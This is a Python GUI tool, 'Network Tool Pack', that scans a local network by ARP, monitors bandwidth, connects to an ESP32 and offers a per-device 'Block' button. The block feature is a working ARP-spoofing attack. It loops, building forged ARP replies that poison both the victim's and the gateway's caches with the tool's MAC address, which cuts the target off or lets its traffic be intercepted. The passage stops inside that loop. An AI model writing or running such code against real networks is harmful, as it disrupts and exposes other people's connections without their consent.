import customtkinter as ctk
from tkinter import messagebox, simpledialog
import threading
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether, srp
from scapy.sendrecv import sendp, sr1
import socket
import psutil
import time
import os
import logging
from collections import defaultdict
import ipaddress  # Added for CIDR calculation
import serial  # Added for ESP32 connection
import serial.tools.list_ports  # Added for listing serial ports


os.environ.pop("SSLKEYLOGFILE", None)

try:
    import certifi

    os.environ.setdefault("SSL_CERT_FILE", certifi.where())
except Exception:
    pass

# ====== Global Logger Setup ======
# Create a custom logger
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Create a file handler
file_handler = logging.FileHandler("network_tool.log")
file_handler.setLevel(logging.INFO)

# Create a formatter and add it to the handler
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)

# Add the handler to the logger
logger.addHandler(file_handler)


# ====== Helper Functions (can be used by class methods) ======
def get_network_cidr(ip_address, netmask):
    """Calculates the network CIDR (e.g., 192.168.1.0/24) from an IP address and its netmask."""
    try:
        network = ipaddress.IPv4Network(f"{ip_address}/{netmask}", strict=False)
        return str(network)
    except ipaddress.AddressValueError:
        return None


def get_all_active_interfaces_details():
    """
    Extracts detailed information about all active network interfaces (IPv4)
    and identifies a primary one.
    Returns:
        tuple: (dict of interface details, primary_interface_name_str)
        interface_details_dict: {
            "interface_name": {
                "ip": "192.168.1.10",
                "netmask": "255.255.255.0",
                "broadcast": "192.168.1.255",
                "mac": "aa:bb:cc:dd:ee:ff",
                "cidr": "192.168.1.0/24"
            },
            ...
        }
    """
    active_interfaces = psutil.net_if_stats()
    net_addrs = psutil.net_if_addrs()
    interface_details_dict = {}
    primary_interface_name = None

    for interface, stats in active_interfaces.items():
        if stats.isup and interface != 'lo':  # Exclude loopback interface
            ipv4_found = False
            mac_addr = None
            for addr in net_addrs.get(interface, []):
                if addr.family == psutil.AF_LINK:  #
                    mac_addr = addr.address

            for addr in net_addrs.get(interface, []):
                if addr.family == socket.AF_INET:  # IPv4 address
                    ipv4_found = True
                    details = {
                        'ip': addr.address,
                        'netmask': addr.netmask,
                        'broadcast': addr.broadcast if addr.broadcast else "N/A",
                        'mac': mac_addr if mac_addr else "N/A",
                        'cidr': get_network_cidr(addr.address, addr.netmask)
                    }
                    interface_details_dict[interface] = details
                    if not primary_interface_name:
                        primary_interface_name = interface
                    break  # Take the first IPv4 address for simplicity

            if not ipv4_found and mac_addr:
                if interface not in interface_details_dict:  # Only add if not already added with IPv4
                    interface_details_dict[interface] = {
                        'ip': "N/A",
                        'netmask': "N/A",
                        'broadcast': "N/A",
                        'mac': mac_addr,
                        'cidr': "N/A"
                    }

    return interface_details_dict, primary_interface_name


def get_active_network_info():
    """Extracts information about active network interfaces and returns a primary one for display."""
    interface_details_dict, primary_interface_name = get_all_active_interfaces_details()
    info = ""
    for interface, details in interface_details_dict.items():
        info += f"Interface: {interface}\n"
        info += f"  IP Address: {details['ip']}\n"
        info += f"  Netmask: {details['netmask']}\n"
        if details['broadcast'] != "N/A":
            info += f"  Broadcast IP: {details['broadcast']}\n"
        info += f"  MAC Address: {details['mac']}\n"
        if details['cidr'] != "N/A":
            info += f"  CIDR: {details['cidr']}\n"
        info += "\n"
    return info if info else "No active network interfaces found with IPv4.", primary_interface_name


def scan_network(ip_range, iface=None):
    """Scans the specified IP range for active devices using ARP requests."""
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    packet = ether / arp
    # srp sends and receives layer 2 packets, timeout in seconds, verbose=0 means no output to console
    result = srp(packet, timeout=3, verbose=0, iface=iface)[0]  # Pass iface here
    devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
    return devices


def save_devices_to_file(devices, filename="network_devices.txt"):
    """Saves found devices (IP, MAC) to a text file."""
    with open(filename, "w") as file:
        for device in devices:
            file.write(f"IP Address: {device['ip']}, MAC Address: {device['mac']}\n")
    logger.info(f"Devices saved to {filename}")


def get_mac(ip, iface=None):
    """Retrieves the MAC address for a given IP address using ARP request."""
    # srp sends a packet on layer 2 (Ethernet)
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=iface)  # Pass iface
    for snd, rcv in ans:
        return rcv[Ether].src  # Return the source MAC from the received Ethernet frame
    return None


def get_my_mac():
    """Retrieves the MAC address of the local machine's primary active interface."""
    interfaces = psutil.net_if_addrs()
    active_stats = psutil.net_if_stats()

    # Iterate through network interfaces to find an active one with a MAC address
    for interface_name, addrs in interfaces.items():
        if interface_name in active_stats and active_stats[interface_name].isup and interface_name != 'lo':
            for addr in addrs:
                if addr.family == psutil.AF_LINK:  # AF_LINK is for MAC addresses
                    return addr.address
    return None


def get_my_ip():
    """Retrieves the IPv4 address of the local machine's primary active interface."""
    interfaces = psutil.net_if_addrs()
    active_stats = psutil.net_if_stats()

    for interface_name, addrs in interfaces.items():
        if interface_name in active_stats and active_stats[interface_name].isup and interface_name != 'lo':
            for addr in addrs:
                if addr.family == socket.AF_INET:  # IPv4 address
                    return addr.address
    return None


# ====== GUI Class ======
class NetworkToolGUI:
    def __init__(self):
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")

        self.root = ctk.CTk()
        self.root.title("Network Monitor")
        self.root.geometry("1250x700")
        self.root.minsize(1000, 600)

        # Colors (Black-Gray theme inspired by EBS-Tool-Pack style)
        self.colors = {
            'bg': '#1a1a1a',  # Darkest background
            'card': '#252525',  # Slightly lighter for panels/cards
            'accent': '#6495ed',  # Cornflower Blue for accent
            'accent_hover': '#527fcf',  # Darker Cornflower Blue for hover
            'text': '#f0f0f0',  # Light text
            'text_dim': '#aaaaaa',  # Dimmed text
            'success': '#32cd32',  # Lime Green for success
            'warning': '#ffd700',  # Gold for warning
            'error': '#dc143c',  # Crimson for error
        }
        self.root.configure(fg_color=self.colors['bg'])

        # State variables for blocking
        self.blocking_active = False
        self.blocking_thread = None
        self.blocked_device_ip = None
        self.blocked_device_mac = None

        # State variables for bandwidth monitoring
        self.bandwidth_monitor_active = False
        self.bandwidth_thread = None
        self.current_bytes_per_ip = defaultdict(int)
        self.bandwidth_lock = threading.Lock()
        self.bandwidth_display_labels = {}
        self.bandwidth_monitor_interval_ms = 1000
        self.bandwidth_update_job_id = None

        # State variables for ESP32 connection
        self.esp32_connected = False
        self.serial_port = None  # Holds the actual serial.Serial object
        self.esp32_console_window = None
        self.esp32_console_textbox = None
        self.esp32_read_thread = None
        self.esp32_baud_rate = 115200  # Fixed baud rate for simplicity

        # Local machine info
        self.my_ip = get_my_ip()
        self.my_mac = get_my_mac()
        # self.active_interface_name is removed, using selected_interface_var

        # Interface management variables
        self.all_interface_details = {}  # To store details from get_all_active_interfaces_details
        self.interface_names = []  # List of names for the dropdown
        self.selected_interface_var = ctk.StringVar(value="Select an Interface")  # Default value for dropdown

        # ESP32 Port Selection variables
        self.esp32_port_names = []
        self.selected_esp32_port_var = ctk.StringVar(value="Select ESP32 Port")  # Default for ESP32 dropdown

        self.main_container = ctk.CTkFrame(self.root, fg_color=self.colors['bg'])
        self.main_container.pack(fill="both", expand=True, padx=20, pady=20)

        self._setup_ui()
        self._populate_interface_dropdown()  # Initial population
        self._populate_esp32_port_dropdown()  # Initial population for ESP32 ports

    def _setup_ui(self):
        """Sets up all the GUI widgets and layout."""
        # Header
        header_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        header_frame.pack(fill="x", pady=(0, 20))

        ctk.CTkLabel(
            header_frame,
            text="Network Tool Pack",
            font=ctk.CTkFont(size=26, weight="bold"),
            text_color=self.colors['accent']
        ).pack(pady=5)
        ctk.CTkLabel(
            header_frame,
            text="Scan, block, and manage network devices using ARP spoofing.",
            font=ctk.CTkFont(size=12),
            text_color=self.colors['text_dim']
        ).pack(pady=(0, 15))

        # Main content area
        content_frame = ctk.CTkFrame(self.main_container, fg_color="transparent")
        content_frame.pack(fill="both", expand=True)
        # Configure content_frame to have two columns that expand
        content_frame.grid_columnconfigure((0, 1), weight=1)
        content_frame.grid_rowconfigure(1, weight=1)

        # Top Panel: Inputs and Actions
        input_action_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
        # This panel now spans two columns
        input_action_panel.grid(row=0, column=0, columnspan=2, sticky="ew", padx=0, pady=(0, 10))
        input_action_panel.grid_columnconfigure((0, 1), weight=1)

        # Input Frame (left side of input_action_panel)
        input_frame = ctk.CTkFrame(input_action_panel, fg_color="transparent")
        input_frame.grid(row=0, column=0, sticky="nsew", padx=15, pady=15)
        input_frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(input_frame, text="IP Range (e.g., 192.168.1.0/24):", text_color=self.colors['text']).grid(row=0,
                                                                                                                column=0,
                                                                                                                sticky="w",
                                                                                                                padx=(
                                                                                                                    0,
                                                                                                                    10),
                                                                                                                pady=5)
        self.ip_entry = ctk.CTkEntry(input_frame,
                                     placeholder_text="Enter IP range for scanning (optional if interface selected)",
                                     fg_color=self.colors['bg'], border_color=self.colors['accent'])
        self.ip_entry.grid(row=0, column=1, sticky="ew", pady=5)

        ctk.CTkLabel(input_frame, text="Gateway IP (e.g., 192.168.1.1):", text_color=self.colors['text']).grid(row=1,
                                                                                                               column=0,
                                                                                                               sticky="w",
                                                                                                               padx=(
                                                                                                                   0,
                                                                                                                   10),
                                                                                                               pady=5)
        self.gateway_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter Gateway IP for blocking",
                                          fg_color=self.colors['bg'], border_color=self.colors['accent'])
        self.gateway_entry.grid(row=1, column=1, sticky="ew", pady=5)

        # Interface Selection
        ctk.CTkLabel(input_frame, text="Select Interface:", text_color=self.colors['text']).grid(row=2, column=0,
                                                                                                 sticky="w",
                                                                                                 padx=(0, 10),
                                                                                                 pady=5)
        self.interface_optionmenu = ctk.CTkOptionMenu(input_frame,
                                                      values=self.interface_names,
                                                      variable=self.selected_interface_var,
                                                      command=self._on_interface_selected,
                                                      fg_color=self.colors['bg'],
                                                      button_color=self.colors['accent'],
                                                      button_hover_color=self.colors['accent_hover'])
        self.interface_optionmenu.grid(row=2, column=1, sticky="ew", pady=5)

        # ESP32 Port Selection
        ctk.CTkLabel(input_frame, text="ESP32 Serial Port:", text_color=self.colors['text']).grid(row=3, column=0,
                                                                                                  sticky="w",
                                                                                                  padx=(0, 10),
                                                                                                  pady=5)
        self.esp32_port_optionmenu = ctk.CTkOptionMenu(input_frame,
                                                       values=self.esp32_port_names,  # Will be populated
                                                       variable=self.selected_esp32_port_var,
                                                       fg_color=self.colors['bg'],
                                                       button_color=self.colors['accent'],
                                                       button_hover_color=self.colors['accent_hover'])
        self.esp32_port_optionmenu.grid(row=3, column=1, sticky="ew", pady=5)

        self.btn_refresh_esp32_ports = ctk.CTkButton(input_frame, text="Refresh ESP32 Ports",
                                                     command=self._populate_esp32_port_dropdown,
                                                     fg_color=self.colors['accent'],
                                                     hover_color=self.colors['accent_hover'],
                                                     height=35)
        self.btn_refresh_esp32_ports.grid(row=4, column=1, sticky="ew", padx=0, pady=5)

        # Action Buttons Frame (right side of input_action_panel)
        action_buttons_frame = ctk.CTkFrame(input_action_panel, fg_color="transparent")
        action_buttons_frame.grid(row=0, column=1, sticky="nsew", padx=15, pady=15)
        action_buttons_frame.grid_columnconfigure((0, 1), weight=1)

        self.btn_info = ctk.CTkButton(action_buttons_frame, text="Show Network Info",
                                      command=self._start_show_network_info,
                                      fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                      height=35)
        self.btn_info.grid(row=0, column=0, sticky="ew", padx=5, pady=5)

        self.btn_scan = ctk.CTkButton(action_buttons_frame, text="Scan Network", command=self._start_scan,
                                      fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                      height=35)
        self.btn_scan.grid(row=0, column=1, sticky="ew", padx=5, pady=5)

        self.btn_monitor_bandwidth = ctk.CTkButton(action_buttons_frame, text="Start Bandwidth Monitor",
                                                   command=self._start_stop_bandwidth_monitor,
                                                   fg_color=self.colors['success'],
                                                   hover_color=self.colors['success'],
                                                   height=35)
        self.btn_monitor_bandwidth.grid(row=1, column=0, sticky="ew", padx=5, pady=5)

        # Main Unblock/Stop Blocking button
        self.btn_unblock_all = ctk.CTkButton(action_buttons_frame, text="Unblock All Devices",
                                             command=self._start_unblock,
                                             fg_color=self.colors['warning'], hover_color=self.colors['warning'],
                                             height=35)
        self.btn_unblock_all.grid(row=1, column=1, sticky="ew", padx=5, pady=5)

        # New Ping Device button
        self.btn_ping_device = ctk.CTkButton(action_buttons_frame, text="Ping Device",
                                             command=self._start_ping_test_dialog,
                                             fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                             height=35)
        self.btn_ping_device.grid(row=2, column=0, sticky="ew", padx=5, pady=5)

        # New Refresh Interfaces button
        self.btn_refresh_interfaces = ctk.CTkButton(action_buttons_frame, text="Refresh Interfaces",
                                                    command=self._populate_interface_dropdown,
                                                    fg_color=self.colors['accent'],
                                                    hover_color=self.colors['accent_hover'],
                                                    height=35)
        self.btn_refresh_interfaces.grid(row=2, column=1, sticky="ew", padx=5, pady=5)

        # ESP32 Connect button
        self.btn_esp32_connect = ctk.CTkButton(action_buttons_frame, text="Connect to ESP32",
                                               command=self._start_esp32_connection,
                                               fg_color=self.colors['accent'], hover_color=self.colors['accent_hover'],
                                               height=35)
        self.btn_esp32_connect.grid(row=3, column=0, sticky="ew", padx=5, pady=5)

        # Status Indicator (Blocking and Bandwidth Monitor)
        self.blocking_status_label = ctk.CTkLabel(action_buttons_frame, text="Status: Idle",
                                                  text_color=self.colors['text_dim'])
        self.blocking_status_label.grid(row=4, column=0, sticky="ew", padx=5, pady=5,
                                        columnspan=2)

        # Log Panel (now on the left, row 1, column 0)
        log_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
        log_panel.grid(row=1, column=0, sticky="nsew", padx=(0, 10), pady=(10, 0))
        log_panel.grid_rowconfigure(1, weight=1)

        ctk.CTkLabel(log_panel, text="Activity Log", font=ctk.CTkFont(size=18, weight="bold"),
                     text_color=self.colors['text']).pack(pady=(15, 10))

        self.log_textbox = ctk.CTkTextbox(
            log_panel,
            fg_color=self.colors['bg'],
            text_color=self.colors['text_dim'],
            wrap="word",
            state="disabled",
            font=ctk.CTkFont(family="Consolas", size=12)
        )
        self.log_textbox.pack(fill="both", expand=True, padx=15, pady=(0, 15))

        # Scanned Devices Panel (now on the right, row 1, column 1)
        devices_panel = ctk.CTkFrame(content_frame, fg_color=self.colors['card'], corner_radius=10)
        devices_panel.grid(row=1, column=1, sticky="nsew", padx=(10, 0), pady=(10, 0))
        devices_panel.grid_rowconfigure(1, weight=1)

        ctk.CTkLabel(devices_panel, text="Scanned Devices & Bandwidth", font=ctk.CTkFont(size=18, weight="bold"),
                     text_color=self.colors['text']).pack(pady=(15, 10))

        # Progress bar for scanning
        self.scan_progress_bar = ctk.CTkProgressBar(devices_panel, orientation="horizontal", mode="determinate",
                                                    progress_color=self.colors['accent'])
        self.scan_progress_bar.set(0)
        self.scan_progress_bar.pack(fill="x", padx=15, pady=(0, 10))

        # Scrollable frame to display devices
        self.devices_scroll_frame = ctk.CTkScrollableFrame(
            devices_panel,
            fg_color=self.colors['bg'],
            corner_radius=8
        )
        self.devices_scroll_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))

    def _populate_interface_dropdown(self):
        """Fetches active interfaces and populates the dropdown menu."""
        self.all_interface_details, primary_interface_name = get_all_active_interfaces_details()
        self.interface_names = list(self.all_interface_details.keys())

        if not self.interface_names:
            self.interface_names = ["No active interfaces found"]
            self.selected_interface_var.set("No active interfaces found")
            self.gui_log_output("No active network interfaces found.", "warning")
            logger.warning("No active network interfaces found to populate dropdown.")
        else:
            self.interface_optionmenu.configure(values=self.interface_names)
            if primary_interface_name and primary_interface_name in self.interface_names:
                self.selected_interface_var.set(primary_interface_name)
                self.gui_log_output(f"Default interface selected: {primary_interface_name}", "blue")
            else:
                self.selected_interface_var.set(self.interface_names[0])
                self.gui_log_output(f"Selected first available interface: {self.interface_names[0]}", "blue")
        self.interface_optionmenu.set(self.selected_interface_var.get())  # Ensure UI updates

    def _populate_esp32_port_dropdown(self):
        """Fetches available serial ports and populates the ESP32 port dropdown menu."""
        ports = serial.tools.list_ports.comports()
        self.esp32_port_names = [port.device for port in ports]

        if not self.esp32_port_names:
            self.esp32_port_names = ["No Ports Found"]
            self.selected_esp32_port_var.set("No Ports Found")
            self.gui_log_output("No serial ports found for ESP32 connection.", "warning")
            logger.warning("No serial ports found to populate ESP32 dropdown.")
        else:
            self.esp32_port_optionmenu.configure(values=self.esp32_port_names)
            # Try to keep the previously selected port if it's still available
            if self.selected_esp32_port_var.get() not in self.esp32_port_names:
                self.selected_esp32_port_var.set(self.esp32_port_names[0])
                self.gui_log_output(f"Selected default ESP32 port: {self.esp32_port_names[0]}", "blue")
            else:
                self.gui_log_output(f"Refreshed ESP32 ports. Current selection: {self.selected_esp32_port_var.get()}",
                                    "blue")

        self.esp32_port_optionmenu.set(self.selected_esp32_port_var.get())  # Ensure UI updates
        # Ensure the ESP32 connect button state is updated based on port availability
        self._update_esp32_button_state(ui_busy=False)

    def _on_interface_selected(self, choice):
        """Callback for when an interface is selected from the dropdown."""
        self.gui_log_output(f"Interface selected: {choice}", "blue")
        if choice in self.all_interface_details and self.all_interface_details[choice]['cidr'] != "N/A":
            self.ip_entry.delete(0, ctk.END)
            self.ip_entry.insert(0, self.all_interface_details[choice]['cidr'])

            ip_addr_parts = self.all_interface_details[choice]['ip'].split('.')
            if len(ip_addr_parts) == 4:
                default_gw_guess = f"{ip_addr_parts[0]}.{ip_addr_parts[1]}.{ip_addr_parts[2]}.1"
                self.gateway_entry.delete(0, ctk.END)
                self.gateway_entry.insert(0, default_gw_guess)
                self.gui_log_output(f"Guessed gateway for {choice}: {default_gw_guess}", "blue")
        else:
            self.ip_entry.delete(0, ctk.END)  # Clear if selected interface has no CIDR
            self.gateway_entry.delete(0, ctk.END)  # Clear gateway too
            self.gui_log_output(
                f"Selected interface {choice} has no valid IPv4 details; clearing IP Range and Gateway.", "yellow")

    def gui_log_output(self, message: str, color_tag: str = None):
        """Thread-safe logging to the GUI textbox with colors and to a file."""
        logger.info(message)
        self.root.after(0, lambda: self._append_log(message, color_tag))

    def _append_log(self, message: str, color: str = None):
        """Appends a message to the log textbox with specific color tagging."""
        self.log_textbox.configure(state="normal")
        tag_name = f"{color}_tag" if color else "default_tag"

        if color == "red":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['error'])
        elif color == "yellow":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['warning'])
        elif color == "green":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['success'])
        elif color == "blue":
            self.log_textbox.tag_config(tag_name, foreground=self.colors['accent'])
        else:
            self.log_textbox.tag_config(tag_name, foreground=self.colors['text'])

        self.log_textbox.insert("end", f"{message}\n", tag_name)
        self.log_textbox.see("end")
        self.log_textbox.configure(state="disabled")

    def _set_ui_busy_state(self, busy: bool, blocking_target_ip: str = None):
        """
        Sets the UI to a busy or idle state, with special handling for blocking.
        If busy is True, UI elements are disabled. If busy is False, they are enabled.
        When blocking_target_ip is provided, it specifically highlights the blocked device's button.
        """
        state = "disabled" if busy else "normal"

        # General UI elements
        self.btn_info.configure(state=state)
        self.btn_scan.configure(state=state)
        self.ip_entry.configure(state=state)
        self.gateway_entry.configure(state=state)
        self.btn_ping_device.configure(state=state)
        self.interface_optionmenu.configure(state=state)
        self.btn_refresh_interfaces.configure(state=state)

        # Bandwidth monitor button state
        if busy:
            self.btn_monitor_bandwidth.configure(state="disabled")
        elif self.bandwidth_monitor_active:
            self.btn_monitor_bandwidth.configure(state="normal", text="Stop Bandwidth Monitor",
                                                 fg_color=self.colors['error'], hover_color=self.colors['error'])
        else:
            self.btn_monitor_bandwidth.configure(state="normal", text="Start Bandwidth Monitor",
                                                 fg_color=self.colors['success'], hover_color=self.colors['success'])

        # Device-specific block buttons
        for device_frame in self.devices_scroll_frame.winfo_children():
            if hasattr(device_frame, 'block_button'):
                if busy:
                    if blocking_target_ip and device_frame.device_ip == blocking_target_ip:
                        device_frame.block_button.configure(state="disabled", text="Blocking...")
                    else:
                        device_frame.block_button.configure(state="disabled")
                else:
                    if not self.blocking_active:
                        device_frame.block_button.configure(state="normal", text="Block")
                    elif self.blocking_active and device_frame.device_ip == self.blocked_device_ip:
                        device_frame.block_button.configure(state="disabled", text="Blocking...")
                    else:
                        device_frame.block_button.configure(state="disabled")

        # Unblock All/Stop Blocking button: always enabled if blocking is active
        if self.blocking_active:
            self.btn_unblock_all.configure(state="normal", text="Stop Blocking", fg_color=self.colors['error'],
                                           hover_color=self.colors['error'])
        else:
            self.btn_unblock_all.configure(state=state, text="Unblock All Devices", fg_color=self.colors['warning'],
                                           hover_color=self.colors['warning'])

        # ESP32 Connect button state - crucial for fix
        # Pass busy state to allow _update_esp32_button_state to decide 'normal' or 'disabled'
        self.root.after(0, lambda: self._update_esp32_button_state(ui_busy=busy))

        self.root.update_idletasks()

    # --- Worker thread functions for GUI responsiveness ---
    def _start_show_network_info(self):
        """Initiates fetching network info in a separate thread."""
        self._set_ui_busy_state(True)
        self.gui_log_output("Fetching network information...", "blue")
        threading.Thread(target=self.show_network_info_task, daemon=True).start()

    def show_network_info_task(self):
        """Task to fetch and display network information."""
        try:
            info, primary_interface_name = get_active_network_info()  # Now using adapted function

            self.root.after(0, lambda: self.log_textbox.configure(state="normal"))
            self.root.after(0, lambda: self.log_textbox.delete("1.0", ctk.END))
            self.gui_log_output("--- Active Network Information ---", "blue")
            self.gui_log_output(info, "default")
            if primary_interface_name:
                self.gui_log_output(f"Primary sniffing interface detected: {primary_interface_name}", "blue")
            self.gui_log_output("--- End Network Information ---", "blue")
            self.root.after(0, lambda: self.log_textbox.configure(state="disabled"))
        except Exception as e:
            self.gui_log_output(f"Error fetching network info: {e}", "red")
            logger.error(f"Error fetching network info: {e}")
        finally:
            self.root.after(0, lambda: self._set_ui_busy_state(False))

    def _start_scan(self):
        """Initiates network scanning in a separate thread."""
        selected_interface = self.selected_interface_var.get()
        manual_ip_range = self.ip_entry.get().strip()
        actual_ip_range = manual_ip_range  # Default to manually entered

        if selected_interface != "Select an Interface" and selected_interface != "No active interfaces found":
            interface_details = self.all_interface_details.get(selected_interface)
            if interface_details and interface_details['cidr'] != "N/A":
                actual_ip_range = interface_details['cidr']
                self.gui_log_output(f"Using IP range from selected interface {selected_interface}: {actual_ip_range}",
                                    "blue")
            else:
                self.gui_log_output(
                    f"Selected interface {selected_interface} has no valid IPv4/CIDR. Falling back to manual IP range.",
                    "yellow")
        else:
            self.gui_log_output("No interface selected. Using manual IP range entry (if provided).", "blue")

        if not actual_ip_range:
            messagebox.showwarning("Cảnh báo", "Hãy nhập phạm vi IP hoặc chọn một giao diện để quét!")
            return

        self._set_ui_busy_state(True)
        self.gui_log_output(
            f"Scanning network for devices in range: {actual_ip_range} on interface {selected_interface}...", "blue")
        self.scan_progress_bar.set(0)
        threading.Thread(target=self.scan_network_task, args=(actual_ip_range, selected_interface,),
                         daemon=True).start()

    def scan_network_task(self, ip_range, scan_interface):
        """Task to scan the network and display results."""
        try:
            self.root.after(0, lambda: self.clear_device_list())
            self.gui_log_output(f"Starting ARP scan for {ip_range} on interface {scan_interface}...", "blue")

            self.root.after(0, lambda: self.scan_progress_bar.set(0.1))

            devices = scan_network(ip_range, iface=scan_interface)  # Pass the interface to scan_network

            self.gui_log_output(f"--- Found {len(devices)} Devices ---", "green")
            self.root.after(0, lambda: self.update_device_list(devices))

            if devices:
                save_devices_to_file(devices)
                self.gui_log_output("Device list saved to network_devices.txt", "green")
            else:
                self.gui_log_output("No devices found.", "warning")
        except Exception as e:
            self.gui_log_output(f"Error scanning network: {e}", "red")
            logger.error(f"Error scanning network: {e}")
        finally:
            self.root.after(0, lambda: self.scan_progress_bar.set(1))
            self.root.after(0, lambda: self._set_ui_busy_state(False))

    def clear_device_list(self):
        """Clears all widgets from the devices_scroll_frame and resets bandwidth labels."""
        for widget in self.devices_scroll_frame.winfo_children():
            widget.destroy()
        self.bandwidth_display_labels.clear()
        self.scan_progress_bar.set(0)
        with self.bandwidth_lock:
            self.current_bytes_per_ip.clear()

    def update_device_list(self, devices):
        """Populates the devices_scroll_frame with scanned devices, including bandwidth labels."""
        self.clear_device_list()

        if not devices:
            ctk.CTkLabel(self.devices_scroll_frame, text="No devices found on this network.",
                         text_color=self.colors['text_dim']).pack(pady=10)
            return

        # Header for the device list
        header_frame = ctk.CTkFrame(self.devices_scroll_frame, fg_color="transparent")
        header_frame.pack(fill="x", pady=(5, 0))
        header_frame.grid_columnconfigure(0, weight=2)
        header_frame.grid_columnconfigure(1, weight=2)
        header_frame.grid_columnconfigure(2, weight=1)
        header_frame.grid_columnconfigure(3, weight=1)

        ctk.CTkLabel(header_frame, text="IP Address", font=ctk.CTkFont(weight="bold"),
                     text_color=self.colors['text']).grid(row=0, column=0, sticky="w", padx=5)
        ctk.CTkLabel(header_frame, text="MAC Address", font=ctk.CTkFont(weight="bold"),
                     text_color=self.colors['text']).grid(row=0, column=1, sticky="w", padx=5)
        ctk.CTkLabel(header_frame, text="Bandwidth", font=ctk.CTkFont(weight="bold"),
                     text_color=self.colors['text']).grid(row=0, column=2, sticky="w", padx=5)
        ctk.CTkLabel(header_frame, text="Action", font=ctk.CTkFont(weight="bold"), text_color=self.colors['text']).grid(
            row=0, column=3, sticky="w", padx=5)

        for i, device in enumerate(devices):
            device_frame = ctk.CTkFrame(self.devices_scroll_frame, fg_color=self.colors['card'], corner_radius=5)
            device_frame.pack(fill="x", pady=2, padx=5)
            device_frame.grid_columnconfigure(0, weight=2)
            device_frame.grid_columnconfigure(1, weight=2)
            device_frame.grid_columnconfigure(2, weight=1)
            device_frame.grid_columnconfigure(3, weight=1)

            ctk.CTkLabel(device_frame, text=device['ip'], text_color=self.colors['text']).grid(row=0, column=0,
                                                                                               sticky="w", padx=5,
                                                                                               pady=2)
            ctk.CTkLabel(device_frame, text=device['mac'], text_color=self.colors['text']).grid(row=0, column=1,
                                                                                                sticky="w", padx=5,
                                                                                                pady=2)

            bandwidth_label = ctk.CTkLabel(device_frame, text="0.0 KB/s", text_color=self.colors['text_dim'])
            bandwidth_label.grid(row=0, column=2, sticky="w", padx=5, pady=2)
            self.bandwidth_display_labels[device['ip']] = bandwidth_label

            block_btn = ctk.CTkButton(
                device_frame,
                text="Block",
                command=lambda ip=device['ip'], mac=device['mac']: self._start_block_from_list(ip, mac),
                fg_color=self.colors['error'],
                hover_color=self.colors['error'],
                width=80, height=25,
                font=ctk.CTkFont(size=12)
            )
            block_btn.grid(row=0, column=3, sticky="e", padx=5, pady=2)

            device_frame.block_button = block_btn
            device_frame.device_ip = device['ip']

        self.root.after(0, lambda: self._set_ui_busy_state(False))

    def _start_block_from_list(self, ip_address, mac_address):
        """Starts blocking a device selected from the list."""
        if self.blocking_active:
            messagebox.showwarning("Cảnh báo",
                                   "Thiết bị khác đang bị chặn. Vui lòng bỏ chặn trước.")
            self.gui_log_output("Cannot start new blocking, another is active.", "yellow")
            return

        gateway_ip = self.gateway_entry.get().strip()
        if not gateway_ip:
            messagebox.showwarning("Cảnh báo",
                                   "Hãy nhập địa chỉ IP Gateway để chặn!")
            return

        selected_interface = self.selected_interface_var.get()
        if selected_interface == "Select an Interface" or selected_interface == "No active interfaces found":
            messagebox.showwarning("Cảnh báo", "Vui lòng chọn một giao diện để thực hiện chặn.")
            self.gui_log_output("Cannot start blocking: No valid interface selected.", "yellow")
            return

        if not self.my_ip or not self.my_mac:
            messagebox.showerror("Lỗi",
                                 "Không thể lấy địa chỉ IP/MAC cục bộ của bạn. Vui lòng thử lại hoặc kiểm tra kết nối mạng.")
            self.gui_log_output("Failed to get local IP/MAC, cannot start blocking.", "red")
            return

        self.blocked_device_ip = ip_address
        self.blocked_device_mac = mac_address

        self.gui_log_output(
            f"Attempting to block device - IP: {ip_address}, MAC: {mac_address} via Gateway: {gateway_ip} on interface {selected_interface}",
            "red")
        self.blocking_active = True
        self.blocking_thread = threading.Thread(target=self.block_device_task,
                                                args=(ip_address, mac_address, gateway_ip, self.my_ip, self.my_mac,
                                                      selected_interface),
                                                daemon=True)
        self.blocking_thread.start()

        self.root.after(0, lambda: self.blocking_status_label.configure(text=f"Status: Blocking {ip_address}...",
                                                                        text_color=self.colors['error']))
        self.root.after(0, lambda: self._set_ui_busy_state(True, ip_address))

    def block_device_task(self, ip_address, mac_address, gateway_ip, my_ip, my_mac, spoofing_interface):
        """Task to continuously send ARP spoofing packets."""
        try:
            if ip_address == my_ip or mac_address == my_mac:
                self.gui_log_output("Cannot block your own device.", "red")
                logger.error("Attempted to block own device.")
                return

            gateway_mac = get_mac(gateway_ip, iface=spoofing_interface)  # Pass interface to get_mac
            if not gateway_mac:
                self.gui_log_output("Could not find MAC address of gateway. Blocking failed.", "red")
                logger.error(
                    f"Could not find MAC for gateway {gateway_ip} on interface {spoofing_interface}. Blocking failed.")
                return

            self.gui_log_output(
                f"Spoofing ARP for target ({ip_address}) and gateway ({gateway_ip}) on interface {spoofing_interface}...",
                "red")
            logger.warning(f"ARP spoofing started for {ip_address} via {gateway_ip} on interface {spoofing_interface}")

            while self.blocking_active:
                packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address,
                                                             hwsrc=my_mac)
                packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac,
                                                              hwsrc=my_mac)
